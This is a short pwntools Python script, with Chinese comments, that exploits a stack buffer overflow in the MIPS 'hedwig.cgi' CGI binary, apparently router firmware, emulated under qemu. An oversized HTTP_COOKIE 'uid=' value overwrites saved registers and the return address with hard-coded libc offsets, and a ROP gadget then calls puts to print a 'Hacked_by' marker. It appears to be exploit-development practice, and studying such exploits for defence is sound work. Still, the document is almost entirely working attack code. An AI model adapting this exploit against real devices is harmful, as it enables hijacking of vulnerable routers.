from pwn import *

context.arch = 'mips'
context.endian = 'little'

libc_base = 0x2b300000
puts_addr = libc_base + 0x2D2C0
#算出 $sp + 0x10 给 $s5，然后跳 puts
gadget_entry = libc_base + 0x159cc

# 1. 构造 Payload (尽量保持长度精简，避免压坏其它栈空间)
payload = b"A" * 1007
payload += p32(puts_addr)      # $s0
payload += b"D" * 32           # 填充 s1-s7, fp (共 9 个寄存器 x 4 = 36字节)
payload += p32(gadget_entry)   # $ra


# Gadget 执行时，$sp 指向的是 $ra 之后的位置。
# addiu $s5, $sp, 0x10 意味着字符串应该在 $ra 后面 16 字节处
payload += b"B" * 16           
payload += b"Hacked_by_YSZ_B!\n"

# 2. 完整的环境变量
env = {
    "HTTP_COOKIE": b"uid=" + payload,
    "REQUEST_METHOD": "POST",
    "CONTENT_LENGTH": "4", # 告诉它我们要发 4 字节的 POST 数据
    "REQUEST_URI": "/hedwig.cgi",
    "SERVER_ADDR": "127.0.0.1",
}

# 3. 启动并喂入数据
cmd = ["qemu-mipsel", "-0", "hedwig.cgi", "-L", ".", "./htdocs/cgibin"]
log.info("🚀 正在发射 Scheme B Payload 并注入 POST 数据...")

p = process(cmd, env=env)

# 重要：因为是 POST，程序在等待输入，我们随便喂点东西给它，让它走完流程
p.sendline(b"A=B") 

print("\n" + "="*40)
print("[+] 宿主机捕获的输出:")
try:
    # 使用 recvall，但如果它崩了，recvall 会立刻返回已有的内容
    output = p.recvall(timeout=3).decode(errors='ignore')
    print(output)
except Exception as e:
    print(f"读取中断: {e}")
print("="*40)